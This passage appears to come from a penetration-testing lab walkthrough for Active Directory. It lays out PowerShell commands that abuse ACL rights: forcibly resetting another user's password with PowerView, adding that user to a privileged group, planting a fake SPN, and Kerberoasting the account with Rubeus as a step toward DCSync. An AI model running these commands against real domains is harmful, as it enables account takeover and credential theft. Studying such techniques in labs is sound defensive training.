So, first, we must authenticate as `wley` and force change the password of the user `damundsen`.

We can start by opening a PowerShell console and authenticating as the `wley` user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0).

#### Creating a PSCredential Object

	PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force 
	PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

#### Creating a SecureString Object

Next, we must create a [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) which represents the password we want to set for the target user `damundsen`.

	PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

we'll use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password.

#### Changing the User's Password

	PS C:\htb> cd C:\Tools\ 
	PS C:\htb> Import-Module .\PowerView.ps1 
	PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

	VERBOSE: [Get-PrincipalContext] Using alternate credentials
	VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
	VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset

We can see that the command completed successfully

changing the password for the target user while using the credentials we specified for the `wley` user that we control.

Next , we need to perform a similar process to authenticate as the `damundsen` user and add ourselves to the `Help Desk Level 1` group.

#### Creating a SecureString Object using damundsen

	PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force 
	PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)


Next, we can use the [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) function to add ourselves to the target group.

#### Adding damundsen to the Help Desk Level 1 Group

	PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

	PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose 
	
	VERBOSE: [Get-PrincipalContext] Using alternate credentials 
	VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'

A quick check shows that our addition to the group was successful.

#### Confirming damundsen was Added to the Group

	PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

We must be authenticated as a member of the `Information Technology` group for this to be successful.We can now use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) to create the fake SPN.

#### Creating a Fake SPN

	PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.

#### Kerberoasting with Rubeus

	PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack

